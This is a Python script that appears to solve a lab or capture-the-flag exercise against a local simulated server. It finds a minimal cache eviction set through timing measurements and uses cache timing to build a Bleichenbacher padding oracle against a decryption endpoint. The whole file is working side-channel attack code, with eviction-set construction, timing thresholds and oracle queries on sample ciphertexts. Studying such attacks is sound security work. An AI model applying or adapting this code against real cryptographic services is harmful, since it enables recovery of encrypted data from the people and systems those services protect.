import time
import random
import requests

from typing import Iterable


SERVER = "http://127.0.0.1:5005"
NUM_CANDIDATES = 200
ADDRESS_SIZE_BYTES = 8  # explicit and clear
TIME_THRESHOLD = 0.0001 * 20
EVICTION_SUPERSET_SIZE_FACTOR = 5


class CacheConfig:
    def __init__(self, cache_config: dict[str, int]):
        self.associativity = cache_config["associativity"]
        self.function_address = cache_config["function_pointer"]
        self.function_size = cache_config["function_size"]
        self.line_length = cache_config["line"]
        self.sets_number = cache_config["sets"]
        self.dram_size = cache_config["dram_size"]
        self.function_lines = self.function_size // self.line_length


def read(addrs: list[int]):
    r = requests.post(f"{SERVER}/read", json={"addrs": addrs})
    return r.json()


def write(addrs: list[int]):
    requests.post(f"{SERVER}/write", json={"addrs": addrs})


def flush():
    requests.post(f"{SERVER}/flush")


def measure_access_function(cache_config: CacheConfig) -> float:
    start = time.perf_counter()
    read([addr for addr in range(cache_config.function_address, cache_config.function_address + cache_config.function_size)])
    return (time.perf_counter() - start) / cache_config.function_size


def is_set_evicting(eviction_set_candidate: set[int], cache_config: CacheConfig) -> bool:
    write(list(eviction_set_candidate))
    return measure_access_function(cache_config) < TIME_THRESHOLD


def create_eviction_superset(cache_config: CacheConfig) -> set[int]:
    superset_size = cache_config.function_lines * cache_config.associativity * EVICTION_SUPERSET_SIZE_FACTOR
    superset_candidate = set(random.sample(range(cache_config.dram_size), superset_size))

    while not is_set_evicting(superset_candidate, cache_config):
       superset_candidate = set(random.sample(range(cache_config.dram_size), superset_size))

    print("created superset")
    return superset_candidate


def build_function_eviction_set(cache_config: CacheConfig) -> list[int]:
    eviction_set = create_eviction_superset(cache_config)
    minimal_eviction_set_size = cache_config.associativity * cache_config.function_lines
    partitions = minimal_eviction_set_size + 1

    while len(eviction_set) > minimal_eviction_set_size:
        eviction_list = list(eviction_set)
        random.shuffle(eviction_list)
        chunk_size = len(eviction_list) // partitions
        subsets = [set(eviction_list[i * chunk_size:(i + 1) * chunk_size]) for i in range(partitions)]
        
        for subset in subsets:
            eviction_set.difference_update(subset)
            if is_set_evicting(eviction_set, cache_config):
                break
            else:
                eviction_set.update(subset)
    
    print("found minimal eviction set")
    return eviction_set


def bleichenbacher_oracle(ciphertext: bytes, eviction_set: set[int], cache_config: CacheConfig, use_flush: bool = False) -> bool:
    if use_flush:
        flush()
    else:
        write(list(eviction_set))

    r = requests.post(f"{SERVER}/oracle", json={"ciphertext": ciphertext})
    if r.status_code != 200:
        print(r.json())
        raise ValueError
    
    average_reload_time = measure_access_function(cache_config)

    return average_reload_time < TIME_THRESHOLD


def main():
    cyphertexts = [
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        "zlFQJpaemhCmuONXmJ+JmsxdUv328UV/N3EQnFIlzy0OaYbagg/NIdKd8yClGQ8KYGE/kwynV6G+cAYR4Dfz+CUfHDooq2laQkS87rDtKvwsxNq/kOO3UqhsjtLgKrQTrfqIQMujbVlfAroZFsIUXCiaoHxNV8Uoiu2TXxnDk5k=",
    ]
    cache_config = CacheConfig(requests.get(f"{SERVER}/config").json())
    eviction_set = build_function_eviction_set(cache_config)

    responses = [bleichenbacher_oracle(cyphertext, eviction_set, cache_config, use_flush=True) for cyphertext in cyphertexts]
    print(responses)


if __name__ == "__main__":
    main()
